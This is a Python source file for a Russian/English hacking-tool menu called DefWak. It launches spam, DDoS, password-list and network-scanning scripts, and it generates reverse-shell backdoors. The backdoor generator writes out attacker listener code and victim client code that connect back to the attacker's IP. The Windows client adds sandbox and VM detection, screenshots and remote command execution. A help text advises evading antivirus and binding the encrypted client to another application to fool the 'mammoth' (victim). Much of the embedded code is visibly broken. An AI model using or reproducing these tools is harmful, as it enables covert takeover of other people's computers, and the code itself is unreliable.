#code written and owned by DefSec16 or Alisher Zhussip
#код написанный и принадлежащий DefSec16 или Алишер Жусiп
import os, random, time
def clean():
	try:
		os.system('clear')
	except:
		os.system('cls')
clean()
ban = random.randint(0,2)
if ban ==0:
  banner =''' \u001b[32m
    ============================================                                           
        _____        ____          __   _    
       |  __ \      / _\ \        / /  | |   
       | |  | | ___| |_ \ \  /\  / /_ _| | __
       | |  | |/ _ \  _| \ \/  \/ / _` | |/ /
       | |__| |  __/ |    \  /\  / (_| |   < 
       |_____/ \___|_|     \/  \/ \__,_|_|\_\   
       
     -----------{Defensive Weakness}------------
    ============================================                                  
       '''

elif ban ==2:
  banner = ''' \u001b[32m
                                                                                          
        88888888ba,                   ad88  I8,        8        ,8I            88         
        88      `"8b                 d8"    `8b       d8b       d8'            88         
        88        `8b                88      "8,     ,8"8,     ,8"             88         
        88         88   ,adPPYba,  MM88MMM    Y8     8P Y8     8P  ,adPPYYba,  88   ,d8   
        88         88  a8P_____88    88       `8b   d8' `8b   d8'  ""     `Y8  88 ,a8"    
        88         8P  8PP"""""""    88        `8a a8'   `8a a8'   ,adPPPPP88  8888[      
        88      .a8P   "8b,   ,aa    88         `8a8'     `8a8'    88,    ,88  88`"Yba,   
        88888888Y"'     `"Ybbd8"'    88          `8'       `8'     `"8bbdP"Y8  88   `Y8a       '''
else:
  banner = ''' \u001b[32m
              ``             /\               /.
              :d.           :Nm.            .s+       
              /MN-         .m:/N-          `mmN       
              /N:N:       .m+  :N-         hs/N       
              /N -N/     `do    -N:       hh /N       
              /N  .m+    hy      -N:     sh` /N       
              /N   .mo  sh`       -m+   od`  /N       
              /N    `dsom`         .m+ +m.   /N       
              :MyyyyyhMMdyyyyyyyyyyydMhMdyyyydm       
                     :Nhh`           :My              
                    -N: sd`         -N/hy             
                   .m+   om`       .m+  hy`           
                  `do     +m.     `do    yh`          
                  hy       /m.    dy      sh`         
                 yh         /N:  hy        om`        
                om`          -N/yh`         om.       
               /m.            -md`           +m.      
              ''`                             ::           
                                                     '''


print(banner)
text ='''          
				\033[35m	~Code by Alisher
					version 1.4
	  ~-{Main Menu}-~
         ~-{Главное Меню}-~
      Что вам будет угодно?(what do you want?) \033[34m
        [1]-DSpamers
        [2]-D-ddos
        [3]-passgen
	[4]-backdoor
	[5]-SkanNet
	[6]-fishing[Скоро]
	[7]-В плане \033[34m
	\033[36m
	[99]-Информация(Information)
	[98]-Удалить программу
	[97]-Обновить
	[0]-Выход(exit)
       (select number)Выберите номер:
       \033[36m'''
print(text)
a = int(input("\033[31mDefWak\033[39m~#:"))
def otv():
	yes = {'yes','y', 'ye','ys','Y','Yes','YES','YE','YS','Да','ДА','Д','д','да','Yeah','YEAH','yeah'}
	no = {'no','n','NO','No','N','Нет','нет','Н','н','НЕ','не','НЕТ','Не','Неа','НЕА','nope','Nope','NOPE'}

	otvet = input('info~#:')
	if otvet in yes:
		os.system("python defwak.py")
	elif otvet in no:
		print("\033[39mПрощайте!(Goodbye!)")
		raise SystemExit
	else:
		print("Дайте пожалуйста ответ(Please,give an answer)")
		otv()
def otv1():
	yes = {'yes','y', 'ye','ys','Y','Yes','YES','YE','YS','Да','ДА','Д','д','да','Yeah','YEAH','yeah'}
	no = {'no','n','NO','No','N','Нет','нет','Н','н','НЕ','не','НЕТ','Не','Неа','НЕА','nope','Nope','NOPE'}

	otvet = input('info~#:')
	if otvet in yes:
		DefSec4()
	elif otvet in no:
		print("\033[39mПрощайте!(Goodbye!)")
		raise SystemExit
	else:
		print("Дайте пожалуйста ответ(Please,give an answer)")
		otv()
def delete():
	os.system('bash uninstall.sh')
def DefSec0():
	print("Прощайте!(Goodbye!)")
	raise SystemExit
def DefSec1():
    os.system("python Spamers.py")
 
def DefSec2():
	os.system('python D-ddos.py')
def DefSec3():
  	os.system('python PassGen.py')
def DefSec4():
	clean()
	ban = random.randint(0,2)
	if ban == 0:
		  banner = ''' \u001b[32m
	    ______            _       _                   
	    | ___ \          | |     | |                  
	    | |_/ / __ _  ___| | ____| | ___   ___  _ __  
	    | ___ \/ _` |/ __| |/ / _` |/ _ \ / _ \| '__| 
	    | |_/ / (_| | (__|   < (_| | (_) | (_) | |    
	    \____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|  '''  
	elif ban == 2:
		   banner = '''   \u001b[32m                                                                                                 
  88888888ba                           88                 88                                           
  88      "8b                          88                 88                                           
  88      ,8P                          88                 88                                           
  88aaaaaa8P'  ,adPPYYba,   ,adPPYba,  88   ,d8   ,adPPYb,88   ,adPPYba,    ,adPPYba,   8b,dPPYba,     
  88""""""8b,  ""     `Y8  a8"     ""  88 ,a8"   a8"    `Y88  a8"     "8a  a8"     "8a  88P'   "Y8     
  88      `8b  ,adPPPPP88  8b          8888[     8b       88  8b       d8  8b       d8  88             
  88      a8P  88,    ,88  "8a,   ,aa  88`"Yba,  "8a,   ,d88  "8a,   ,a8"  "8a,   ,a8"  88             
  88888888P"   `"8bbdP"Y8   `"Ybbd8"'  88   `Y8a  `"8bbdP"Y8   `"YbbdP"'    `"YbbdP"'   88         '''   
	else:
		    banner = ''' \u001b[32m
		      ``             /\               /.
		      :d.           :Nm.            .s+       
		      /MN-         .m:/N-          `mmN       
		      /N:N:       .m+  :N-         hs/N       
		      /N -N/     `do    -N:       hh /N       
		      /N  .m+    hy      -N:     sh` /N       
		      /N   .mo  sh`       -m+   od`  /N       
		      /N    `dsom`         .m+ +m.   /N       
		      :MyyyyyhMMdyyyyyyyyyyydMhMdyyyydm       
			    :Nhh`           :My              
			   -N:sd`          -N/hy             
			  .m+   om`       .m+  hy`           
			 `do     +m.     `do    yh`          
			 hy       /m.    dy      sh`         
			yh         /N:  hy        om`        
		       om`          -N/yh`         om.       
		      /m.            -md`           +m.      
		      ''`                             ::           
							  '''
	print(banner)
	text = ''' 	\033[34m
	     [1]-backdoorV1
	     [2]-backdoorV2
	     [3]-Применение(application)
	     [4]-Мои бэкдоры(My backdoors) \033[34m
	     \033[36m
	     [99]-Назад в главное меню(back to main menu)
	     [0]-Выход(Exit)
	\033[36m     '''
	print(text)
	back = int(input("\033[31mBackdoor\033[39m~#:"))
	def Backdoor0():
		print("\033[39mПрощайте!(Goodbye!)")
		raise SystemExit
	def Backdoor1():
		clean()
		banner1 = ''' \u001b[32m
	______            _       _                         __  
	| ___ \          | |     | |                       /  | 
	| |_/ / __ _  ___| | ____| | ___   ___  _ __ ______`| | 
	| ___ \/ _` |/ __| |/ / _` |/ _ \ / _ \| '__|______|| | 
	| |_/ / (_| | (__|   < (_| | (_) | (_) | |         _| |_
	\____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|         \___/
                                                        
                                                        
		'''
		print(banner1)
		text1 = ''' \033[34m
		[1]-server (Создать)(Create)
		[2]-client (Создать)(Create)\033[34m
		\033[36m
		[99]-Назад(back)
		[0]-Выход(Exit)
		\033[36m'''
		print(text1)
		bdv1 = int(input('\033[31mBackdoor\033[39m~#:'))
		def Backdoor0():
			print("\033[39mПрощайте!(Goodbye!)")
			raise SystemExit
		def Backdoor99():
			DefSec4()
		def BackdoorS():
			os.chdir('USER-BD')
			ip = input('Введите свой IP(Enter IP):')
			pt = input('Введите порт(Enter Port):')
			v = str(input('Имя файла вашего бэкдора(File name of your backdoor) (file.py):'))
			k = open(v,"w",encoding='utf-8')
			k.write("""import socket, json
#Хакер
class Listener:
	def __init__(self, ip, port):
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		listener.bind((ip, port)) 
		listener.listen(0)
		print('[*] Waiting for incoming connections')
		self.connection, address = listener.accept()
		print('[*] got a connection from' + str(address))
	def reliable_send(self, data):
		json_data = json.dumps(data):
		self.connection.send(json_data)
	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue
	def execute_remotely(self, command):
		self.connection.send(command)
		if command[0] == "exit":
			self.connection.close()
			exit()
		
		return self.reliable_receive()
		return self.connection.recv(1024)
	def go(self):
		while True:
			command = input("~#")
			command = command.split(" ")
			result = self.execute_remotely(command)
			print(result)
my_listener = Listener('"""+str(ip)+""", """+str(pt)+"""')  #ip  хакера и лбой порт 4444 8080 и т.д Обезательно!
my_listener.go() """)	
			k.close()
			print('Готово!(Done!)')
			print('Посмотрите в папке USER-BD')
			print('Look in the USER-BD folder')
				
		def BackdoorC():
			os.chdir('USER-BD')
			ip = input('Введите свой IP(Enter IP):')
			pt = input('Введите порт(Enter Port):')
			f = str(input('Имя файла вашего бэкдора(File name of your backdoor) (file.py):'))
			n = open(f,"w",encoding='utf-8')
			n.write("""#Жертва
import socket
import subprocess
import json
class Backdoor:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))
	def reliable_send(self, data):
		json_data = json.dumps(data):
		self.connection.send(json_data)
	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue
	def execute_system_command(self, command):
		return subprocess.check_output(command, shell=True)
	def run(self):
		while True:
			command = self.reliable_receive()
			if command[0] == "exit":
				self.connection.close()
				exit()
			command_result = self.execute_system_command(command)
			self.reliable_send(command_result)
	
my_backdoor = Backdoor('"""+str(ip)+""", """+str(pt)+""") #ip хакера обезательно!
my_backdoor.run() """)
			n.close()
			print('Готово!(Done!)')
			print('Посмотрите в папке USER-BD')
			print('Look in the USER-BD folder')	
		if bdv1 ==1:
			BackdoorS()
		elif bdv1 ==2:
			BackdoorC()
		elif bdv1 ==99:
			Backdoor99()
		elif bdv1 ==0:
			Backdoor0()
	def Backdoor2():
		clean()
		banner2 = '''
	______            _       _                   _____ 
	| ___ \          | |     | |                 / __  \
	| |_/ / __ _  ___| | ____| | ___   ___ ______`' / /'
	| ___ \/ _` |/ __| |/ / _` |/ _ \ / _ \______| / /  
	| |_/ / (_| | (__|   < (_| | (_) | (_) |     ./ /___
	\____/ \__,_|\___|_|\_\__,_|\___/ \___/      \_____/ '''
		print(banner2)
		text2 = ''' \033[34m
		[1]-server (Создать)(Create)
		[2]-client (Создать)(Create)\033[34m
		[3]-Примечание к бэкдору(Backdoor note)
		\033[36m
		[99]-Назад(back)
		[0]-Выход(Exit)
		\033[36m'''
		print(text2)
        bdv2 = int(input('\033[31mBackdoor\033[39m~#:'))
		
		def Backdoor0():
			print("\033[39mПрощайте!(Goodbye!)")
			raise SystemExit
		def Backdoor99():
			DefSec4()
		def Backdoor3():
			textb = '''
			Необходимо установить pyscreeze pywin32 WMI черeз pip
			(You need to install pyscreeze pywin32 WMI through pip)'''
			
			print(textb)
		def Backdoor1():
			os.chdir('USER-BD')
			ipu = input('Введите свой IP')
			ptu = input('Введите порт')
			e = str(input('Имя файла вашего бэкдора(File name of your backdoor) (file.py):'))
			b = open(e,"w",encoding='utf-8')
			b.write("""
			import socket, os, time, threading, sys
from queue import Queue
# Хакер
intThreads = 2
arrJobs = [1,2]
queue = Queue()

arrAddresses = []
arrConnections = []

strHost = '"""str(ipu)+"""'   #ip хакера
intPort = """str(ptu)+"""

intBuff = 1024
decode_utf = lambda data: data.decode("utf-8")

remove_quotes = lambda string: string.replace("\"","")

center = lambda string, title: f"{{:^{len(string)}}}".format(title)

send = lambda data: conn.send(data)

recv = lambda buffer: conn.recv(buffer)
def recvall(buffer):
	byData = b""
	while True:
		bytPart = recv(buffer)
		if len(bytPart) == buffer:
			return bytPart
		byData += bytPart

		if len(byData) == buffer:
			return byData
def create_socket():
	global objSocket
	try:
		objSocket = socket.socket()
		objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	except socket.error() as strError:
		print("Error creating socket" + str(strError))
def socket_bind():
	global objSocket
	try:
		print("Listening on port:" + str(intPort))
		objSocket.bind((strHost,intPort))
		objSocket.listen(20)
	except socket.error() as strError:
		print("Error binding socket" +str(strError))
		socket_bind()
def socket_accept():
	while  True:
		try:
			conn, address = objSocket.accept()
			conn.setblocking(1)
			arrConnections.append(conn)
			client_info = decode_utf(conn.recv(intBuff)).split("',")
			address += client_info[0], client_info[1], client_info[2]
			arrAddresses.append(address)
			print("\n"+ "Connection has been established : {0} ({1})".format(address[0],address[2]))
		except socket.error:
			print("Error acceptting connections")
			continue

def menu_help():
	print("\n"+"--help")
	print("--l system  (система)")
	print("--x exit (выход)")
	print("--m [text] (сообщение на экран")
	print("--i 0")
	print("--p (скрин экрана")
	print("--x 1 (заблокировать экран)")
	print("--e")
def main_menu():
	while  True:
		strChoice =input("\n"+"~#")
		if strChoice == "--l":
			list_connections()
		elif strChoice[:3] == "--i" and len(strChoice) > 3:
			conn = select_connection(strChoice[4:], "True")
			if conn is not None:
				send_command()
		elif strChoice == "--p":
			screenshot()

		elif strChoice =="--x":
			close()
			break
		else:
			print('invalid choice')
			menu_help()
def close():
	global arrConnections, arrAddresses
	if len(arrAddresses) ==0:
		return
	for intCounter, conn in enumerate(arrConnections):
		conn.send(str.encode("exit"))
		conn.close()
	del arrConnections; arrConnections = []
	del arrAddresses; arrAddresses = []
def list_connections():
	if len(arrConnections) > 0:
		strClients = ""
		for intCounter, conn in enumerate(arrConnections):
			strClients += str(intCounter) + 4*" " + str(arrAddresses[intCounter][0]) + 4*" " + \
				str(arrAddresses[intCounter][1]) + 4*" "+ str(arrAddresses[intCounter][2])+ 4*" "+ \
				str(arrAddresses[intCounter][3]) + "\n"

		print("\n"+ "ID"+ 3*" "+center(str(arrAddresses[0][0])), "IP" ) + 4*" "+
			center(str(arrAddresses[0][1]), "Port") + 4*" "+
			center(str(arrAddresses[0][2]), "PC Name") + 4*" " +
			center(str(arrAddresses[0][3]), "OS") + "\n" +strClients, end= ""
	else:
		print("No connections(нет соединения)")
def select_connection(connection_id, blnGetResponse):
	global conn, arrInfo
	try:
		connection_id = int(connection_id)
		conn = arrConnections[connection_id] 
	except:
		print("invalid choice")
		return
	else:
		arrInfo = str(arrAddresses[connection_id][0]),str(arrAddresses[connection_id][2]), \
		str(arrAddresses[connection_id][3]), \
		str(arrAddresses[connection_id][4])
		if blnGetResponse == "True":
			print("You are connected to" + arrInfo[0] + "......." + "\n")
		return conn

def send_commands():
	while True:
		strChoice = input("\n" + "Type Selection")
		if strChoice[:3] == "--m" and len(strChoice) > 3:
			strMsg = "msg" + strChoice[4:] 
			send(str.encode(strMsg))
		elif strChoice[:3] == "--o" and len(strChoice) > 3:
			strSite = "site" + strChoice[4:]
			send(str.encode(strSite))
		elif strChoice == "--p":
			screenshot()
		elif strChoice == "--x 1":
			send(str.encode("lock"))
		elif strChoice == "--e":
			command_shell()
def command_shell():
	send(str.encode("cmd"))
	strDefault = "\n"+ decode_utf(recv(intBuff)) + ">"
	print(strDefault, end= "")

	while True:
		strCommand = input()
		if strCommand == "quit" or strCommand == "exit":
			send(str.encode("goback"))
		elif strCommand == "cmd":
			print("Please do not use this command..")
		elif len(str(strCommand)) > 0:
			send(str.encode(strCommand))
			intBuff = int(decode_utf(recv(intBuff)))
			strClientResponse = decode_utf(recvall(intBuffer))
			print(strClientResponse, end="")
		else:
			print(strDefault, end="")
def screenshot():
	send(str.encode("screen"))
	strClientResponse = decode_utf(recv(intBuff))
	print("\n" + strClientResponse)
	intBuffer = ''
	for intCounter in range(0,len(strClientResponse)):
		if strClientResponse[intCounter].isdigit():
			intBuffer += strClientResponse[intCounter]
	intBuffer = int(intBuffer)
	strFile = time.strftime("%Y%m%d%H%M%S" + ".png")
	ScrnData = recvall(intBuffer)
	objPic = open(strFile, "wb")
	objPic.write(ScrnData); objPic.close()
	print("Done" + "\n" + "Total bytes recevied:" + os.path.getsize(strFile)) + "bytes"


def create_threads():
	for _ in range(intThreads):
		objThread =threading.Thread(target=work)
		objThread.daemon = True
		objThread.start()
	queue.join()

def work():
	while True:
		intValue = queue.get()
		if intValue == 1:
			create_socket()
			socket_bind()
			socket_accept()
		elif intValue == 2:
			while True:
				time.sleep(0.2)
				if len(arrAddresses) > 0:
					break

		queue.task_done()
		queue.task_done()
		sys.exit(0)
def create_jobs():
	for intThreads in arrJobs:
		queue.put(intThreads)
	queue.join()

create_threads()
create_jobs()
			""")
			b.close
			print('Готово!(Done!)')
			print('Посмотрите в папке USER-BD')
			print('Look in the USER-BD folder')
		def Backdoor2():
			os.chdir('USER-BD')
			ipy = input('Введите свой IP')
			pty = input('Введите порт')
			q = str(input('Имя файла вашего бэкдора(File name of your backdoor) (file.py):'))
			a = open(q,"w",encoding='utf-8')
			a.write("""
			# надо установить 
import socket, os, sys, platform, time, ctypes,subprocess,threading,wmi
# Жертва
import win32api , winerror , win32event, win32crypt

from winreg import *

strHost = '"""str(ipy)+"""'

intPort = """str(pty)+"""

strPath = os.path.realpath(sys.argv[0])

TMP = os.environ['APPDATA']

intBuff =1024

mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")

if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
	mutex = None
	sys.exit(0)

def detectSandboxie():
	try:
		libHandle =ctypes.windll.LoadLibrary("SbieDll.dll")
		return " (Sandboxie) "
	except: return ""
def detectVM():
	objWMI = wmi.WMI()
	for objDiskDrive in objWMI.query("Select * from Win32_DiskDrive"):
		if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
			return " (virtual machine) "
	return " "
def server_connect():
	global objSocket
	while True:
		try:
			objSocket = socket.socket()
			objSocket.connect((strHost, intPort))
		except socket.error:
			time.sleep(5)
		else: break
	struserInfo = socket.gethostname() + "'," + platform.system() + " " + platform.release() + detectSandboxie() + detectVM() + "'," + os.environ["USERNAME"]
	send(str.encode(struserInfo))
decode_utf8 = lambda data: data.decode("utf-8")
recv = lambda Buffer: objSocket.recv(Buffer)
send = lambda data: objSocket.send(data)
server_connect()
def screenshot():
	pyscreeze.screenshot(TMP + "/s.png")
	send(str.encode("Receiving screenshot..." + "\n" + "File size:" + str(os.path.getsize(TMP + "/s.png"))
		+ "bytes" + "\n" + "Please wait..."))
	objPic = open(TMP + "/s.png", "rb")
	time.sleep(1)
	send(objPic.read())
	objPic.close()
def lock():
	ctypes.windll.user32.LockWorkStation()
def command_shell():
	strCurrentDir = str(os.getcwd())
	send(str.encode(strCurrentDir))
	while True:
		strData = decode_utf8(recv(intBuff))
		if strData == "goback":
			os.chdir(strCurrentDir)
			break
		elif strData[:2].lower()== "cd" or strData[:5].lower()=="chdir":
			objCommand = subprocess.Popen(strData + " & cd", stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE, shell = True)
			if (objCommand.stderr.read()).decode("utf-8") == "":
				strOutput = (ObjCommand.stdout.read()).decode("utf-8").splitlines()[0]
				os.chdir(strOutput)
				bytData = str.encode("\n"+ str(os.getcwd()) + ">")
		elif len(strData) > 0:
			objCommand = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE, shell = True)
			strOutput = (ObjCommand.stdout.read() + objCommand.stderr.read()).decode("utf-8", errors = "replace")
			bytData = str.encode("\n" + str(os.getcwd()) + ">")
		else:
			bytData = str.encode("Error")
		strBuffer = str(len(bytData))
		send(str.encode(strBuffer))
		time.sleep(0.1)
		send(bytData)


def MessageBox(message):
	objVBS = open(TMP + "/m.vbs", "w")
	objVBS.write("MsgBox " + message + " " + vbOkOnly + vbInformation + vbSystemModal, "Message")
	objVBS.close()
	subprocess.Popen(["cscript", TMP +"/m.vbs"], shell = True)

while True:
	try:
		while True:
			strData = recv(intBuff)
			strData = decode_utf8(strData)
			if strData == "exit":
				objSocket.close()
				sys.exit(0)
			elif strData[:3] == "msg":
				MessageBox(strData[:3])
			elif strData[:4] == "site":
				webbrowser.get().open(strData[4:])
			elif strData == "screen":
				screenshot()
			elif strData == "lock":
				lock()
			elif strData == "cmd":
				command_shell()
	except socket.error:
		objSocket.close()
		del objSocket
		server_connect()
			""")
			a.close
			print('Готово!(Done!)')
			print('Посмотрите в папке USER-BD')
			print('Look in the USER-BD folder')
		if bdv2 ==1:
			Backdoor1()
		elif bdv2 ==2:
			Backdoor2()
		elif bdv2 ==3:
			Backdoor3()
		elif bdv2 ==99:
			Backdoor99()
		elif bdv2 ==0:
			Backdoor0()
	def Backdoor3():
		text = ''' \033[33m
Рус-RU
И так я написал простенький бэкдор состоит он из:
1-Клиент для жертвы
2-Сервер для хакера
В папке USER-BD будут сохранены файлы backdoor или,
в разделе "Мои бэкдоры"
Чтоб антивирусы не палили бэкдор,соединение произходит самой жертвой,
то есть соединение будет происходить к серверу.
НО прежде чем использовать Клиент надо зашифровать и склеить с приложением
Что бы всё работало необходимо:когда клиент и сервер оба включены 
Когда всё прошло успешно вы можете управлять системой через терминал
P.s Учитывая какая ОС таким и команды нужно вводить

Англ-Eng
And so I wrote a simple backdoor it consists of:
1-Client for the victim
2-Server for the hacker
Backdoor files will be saved in the USER-BD folder or,
in the "My backdoors" section
So that antiviruses do not fire backdoor, the connection is made by the victim itself,
that is, the connection will occur to the server.
BUT before using the Client must be encrypted and glued with the application
For everything to work, it’s necessary: when the client and server are both turned on
When everything went well you can control the system through the terminal
P.s Given which OS and commands you need to enter	'''
		print(text)
		print('')
		print('Перейти назад?(Go back?){Если нет,то выход}{If not, then exit}\n Да/Нет | Yes/No')
		otv1()
	def Backdoor4():
		os.chdir('USER-BD')
		os.system('ls')
	def Backdoor99():
		os.system("python defwak.py")
	if back == 0:
		Backdoor0()
	elif back == 99:
		Backdoor99()
	elif back ==1:
		Backdoor1()
	elif back ==2:
		Backdoor2()
	elif back ==3:
		Backdoor3()
	elif back == 4:
                Backdoor4()
	else:
		print("Не найдено(Not found)")
def DefSec99():
	clean()
	texta = """
	\033[33m
Рус-RU
Информация о программах:
1)DSpamers - DefineSpamers 
  Перевод:Определить спамер
  на данный момент есть 3 версии спамеров
2)D-DDos - DefineDDos 
  Перевод: Определить ДДосер
  на данный момент есть 3 разных ддосреа
3)PassGen - Password Generation
  Перевод: Генерация пароля
  Оно генерирует пароли по ключевым словам,
  чем больше слов тем обширнее список паролей.
  Список паролей сохраняется в txt формате
4)BackDoor - Черный вход 
  Нужен для удаленного контроля при помощи терминала.
  состоит из клиента который должен запустить мамонт(Жертва)
и сервера который должен запустить хакер 
5)SkanNet -Skaner Network
  Перевод:Сконирование сети
  Сканирует и отправляет пакеты на запрос МАК Адреса
  нужно быть в одной сети работает на Linux

Англ-Eng
Information about the programs:
1)DSpamers - DefineSpamers
  Сurrently there are 3 versions of spammers
2)D-DDos - DefineDDos 
  at the moment there are 3 different ddos
3)PassGen - Password Generation
  It generates passwords for keywords,
  the more words, the more extensive the password list.
  Password list saved in txt format
4)BackDoor 
  Required for remote control using the terminal.
  consists of a client who must launch a mammoth (victim)
  and the server on which the hacker should work
5)SkanNet -Skaner Network
  Scans and sends packets to request a MAC address
  must be on the same network (linux)"""
	print(texta)
	print('')
	print('Перейти в главное меню?(Go to the main menu?){Если нет,то выход}{If not, then exit}\n Да/Нет | Yes/No')
	otv()
def DefSec97():
	os.system('bash upgrade.sh')
def DefSec5():
	os.chdir("SkanNet")
	os.system("python3 skannet.py")
def DefSec6():
	clean()
	bannerf = '''\033[32m
	______ _     _     _     _                 
	| ___ \ |   (_)   | |   (_)                
	| |_/ / |__  _ ___| |__  _ _ __   __ _ ___ 
	|  __/| '_ \| / __| '_ \| | '_ \ / _` / __|
	| |   | | | | \__ \ | | | | | | | (_| \__ \
	\_|   |_| |_|_|___/_| |_|_|_| |_|\__, |___/
					  __/ |    
					 |___/     
	'''
	print(bannerf)
	textf = '''
\033[34m	[1]-
	[2]-
	
\033[36m	[99]-Назад(Back)
	[0]-Выход(Exit)
	'''
	print(textf)
	ph = int(input("\033[31mPhish\033[39m~#:"))
	def phish99():
		 os.system("python defwak.py")
	def phish0():
		print("\033[39mПрощайте!(Goodbye!)")
		raise SystemExit 
	
	if ph ==99:
		 phish99()
	elif ph ==0:
		 phish0()
	else:
		print('Ошибка:не найдено(Error:not found)') 
def upmenu():
	print("1-Termux  2-Linux")
	ue = int(input("Что у вас?(What do you have?)"))
	if ue ==1:
	    print('Будет сделано(Will be done!)')
	    time.sleep(2)
	    os.system('bash upgrade.sh')
	elif ue ==2:
	    print('Будет сделано(Will be done!)')
	    time.sleep(2)
	    os.system('bash upgradeLinux.sh')
	else:
	    print('Ошибка:не найдено(Error:not found)')
	    upmenu()
	      
if a ==0:
  DefSec0()
elif a ==1:
  DefSec1()
elif a ==2:
  DefSec2()
elif a ==3:
  DefSec3()
elif a ==4:
  DefSec4()
elif a ==5:
  DefSec5()
elif a ==99:
  DefSec99()
elif a ==98:
	delete()
elif a ==97:
	DefSec97()
else:
	print('Ошибка:не найдено(Error:not found)')
	time.sleep(3)
	os.system("python defwak.py")
